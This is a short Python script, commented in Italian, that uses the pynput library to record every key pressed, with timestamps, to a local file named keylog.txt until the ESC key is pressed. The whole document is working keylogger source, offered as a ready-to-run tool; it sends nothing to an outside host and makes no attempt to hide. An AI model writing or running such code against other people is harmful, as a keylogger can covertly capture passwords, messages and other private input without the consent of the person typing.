from pynput.keyboard import Listener, Key
import logging

# Configura il file di log
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        # Logga la chiave premuta
        logging.info(f"{key.char}")
    except AttributeError:
        # Gestisci i tasti speciali (come backspace, shift, ecc.)
        logging.info(f"{key}")

def on_release(key):
    if key == Key.esc:
        # Termina il keylogger quando viene premuto ESC
        return False

# Avvia il listener per monitorare i tasti premuti
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
